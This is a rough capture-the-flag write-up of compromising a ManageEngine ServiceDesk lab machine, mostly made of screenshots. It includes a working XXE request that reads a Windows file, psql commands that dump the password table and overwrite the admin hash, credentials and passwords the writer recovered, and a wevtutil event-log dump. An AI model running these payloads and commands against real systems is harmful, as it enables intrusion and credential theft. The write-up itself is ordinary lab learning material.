# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
![](https://i.imgur.com/33sgwCq.png)
49667 is included
#### Port `8080`
![](https://i.imgur.com/PDrAqcZ.png)

![](https://i.imgur.com/4VwOu3R.png)
![](https://i.imgur.com/yLo3how.png)
![](https://i.imgur.com/4zMEdtH.png)

https://www.exploit-db.com/exploits/46674
![](https://i.imgur.com/OZ6DB4E.png)
https://github.com/devcoinfet/Manage-Engine-9.3-xxe-/blob/master/Mengine_Xxe.py
![](https://i.imgur.com/Ottq5Be.png)
- HTTP session request
```Http
POST /j_security_check HTTP/1.1
Host: 10.10.10.132:8080
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Length: 241
Content-Type: application/x-www-form-urlencoded

j_username=guest&j_password=guest&LDAPEnable=false&hidden=For+Domain&AdEnable=false&DomainCount=0&LocalAuth=No&LocalAuthWithDomain=No&dynamicUserAddition_status=true&localAuthEnable=true&logonDomainName=-1&loginButton=Login&checkbox=checkbox
```
- With the Cookie
```http
POST /api/cmdb/ci HTTP/1.1
Host: 10.10.10.132:8080
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Cookie: JSESSIONID=A92A4BB49E637F18C54F1573A2275FBE; JSESSIONIDSSO=153DC05DDC4090AD2A583712D29729B2; _rem=true; febbc30d=af52fd18c62a4f7f83b521645522e4f7; mesdpe157143457=a55efd899e88554727c10406a9ba3423a4d0a3f9
Content-Length: 491
Content-Type: application/x-www-form-urlencoded

OPERATION_NAME=add&INPUT_DATA=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe15d41+SYSTEM+%22file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini%22%3E+%5D%3E%3CAPI+version%3D%271.0%27+locale%3D%27en%27%3E%0A++++%3Crecords%3E%0A++++++++%3Crecord%3E%0A++++++++++++%3Cparameter%3E%0A++++++++++++++++%3Cname%3ECI+Name%3C%2Fname%3E%0A++++++++++++++++%3Cvalue%3ETomcat+Server+3+rexder%26xxe15d41%3Brexder%3C%2Fvalue%3E%0A++++++++++++%3C%2Fparameter%3E%0A++++++++%3C%2Frecord%3E%0A++++%3C%2Frecords%3E%0A%3C%2FAPI%3E%0A
```
![](https://i.imgur.com/cRfeHgz.png)
```
username: alice password: $sys4ops@megabank!
admin required: no
shadow admin accounts: mike_adm:Password1 
dr_acc:dr_acc
```
### Gaining Access
![](https://i.imgur.com/k5wSdvL.png)
## Internal
### Enumeration
![](https://i.imgur.com/XA2SW3P.png)
123,500,4500
![](https://i.imgur.com/X3UaHkn.png)
![](https://i.imgur.com/e3IdNLa.png)
- There is Database called `pgsql` - https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
```
#------------------------------------------------------------------------------
# FILE LOCATIONS
#------------------------------------------------------------------------------

# The default values of these variables are driven from the -D command-line
# option or PGDATA environment variable, represented here as ConfigDir.

#data_directory = 'ConfigDir'		# use data in another directory
					# (change requires restart)
#hba_file = 'ConfigDir/pg_hba.conf'	# host-based authentication file
					# (change requires restart)
#ident_file = 'ConfigDir/pg_ident.conf'	# ident configuration file
					# (change requires restart)

# If external_pid_file is not explicitly set, no extra PID file is written.
#external_pid_file = ''			# write an extra PID file
					# (change requires restart)

# Add settings for extensions here
include_if_exists 'postgres_ext.conf'
port=65432
```
![](https://i.imgur.com/OE2U4DI.png)

- the Postgres database to connect we got the tools in `pgsql\bin`
	- `psql -h <host> -U <username> -d <database>`
- ![](https://i.imgur.com/RKPK6lg.png)
![](https://i.imgur.com/43yVBfb.png)
`./psql.exe -h 127.0.0.1 -p 65432 -U postgres -d servicedesk -c "select * from aaapassword"`
- `./psql.exe -h 127.0.0.1 -p 65432 -U postgres -d servicedesk -c "select aaauser.first_name,aaapassword.password from aaauser,aaapassword where aaauser.user_id = aaapassword.password_id"`
- `./psql.exe -h 127.0.0.1 -p 65432 -U postgres -w -d servicedesk -c "update aaapassword set password='$2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG', salt='$2a$12$6VGARvoc/dRcRxOckr6Wmu' where password_id = 2;"`
### Gaining Access
![](https://i.imgur.com/9Y0nRRP.png)

```
0987654321       (ZacharyMoore)
1q2w3e4r         (FionaDrake)
```
![](https://i.imgur.com/IHCdEjM.png)
on the way i got i another idea to change password
![](https://i.imgur.com/G397ltI.png)

![](https://i.imgur.com/uqCuxo2.png)

![](https://i.imgur.com/IC6mDK6.png)
i got admin access, But i can access any flags user or root (That’s because the flags are `EFS` encrypted : )but the user is on the `tolu` user.
![](https://i.imgur.com/jBdKfcT.png)
![](https://i.imgur.com/C60dri4.png)
- So By my Previous Account `zachary` i dumped the event and filtered the user
	- ` wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321 > eventlog.txt `
### Maintaining Access
![](https://i.imgur.com/3GGUdM0.png)
- I Decrypted the files EFS
	- 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29
![](https://i.imgur.com/KFJ0hp7.png)

-> ????????????? I tried to check if there is impersonation token , check ippsec
![](https://i.imgur.com/hPzs1h3.png)
![](https://i.imgur.com/tCBq8Ic.png)
![](https://i.imgur.com/ObSw553.png)




# Random Notes